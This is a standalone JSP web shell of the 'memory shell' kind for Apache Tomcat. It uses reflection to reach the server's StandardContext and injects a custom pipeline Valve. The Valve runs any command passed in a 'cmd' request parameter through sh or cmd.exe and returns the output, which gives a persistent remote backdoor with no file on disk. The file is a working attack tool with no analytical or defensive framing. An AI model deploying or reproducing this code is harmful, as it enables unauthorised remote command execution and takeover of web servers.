<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Valve" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" language="java" %>


<%
    final class myValve implements Valve {
        @Override
        public Valve getNext() {
            return null;
        }

        @Override
        public void setNext(Valve valve) {

        }

        @Override
        public void backgroundProcess() {

        }

        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) request;
            if (req.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                try {
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String output = s.hasNext() ? s.next() : "";
                    response.getWriter().write(output);
                    response.getWriter().flush();
                    return;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            this.getNext().invoke(request, response);
        }

        @Override
        public boolean isAsyncSupported() {
            return false;
        }
    }
%>

<%
    try {
        final String name = "shell";
        // 获取上下文
        ServletContext servletContext = request.getSession().getServletContext();

        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

        myValve myvalve = new myValve();
        standardContext.getPipeline().addValve(myvalve);
        response.getWriter().write("Inject Success");
    } catch (Exception e) {
        e.printStackTrace();
    }
%>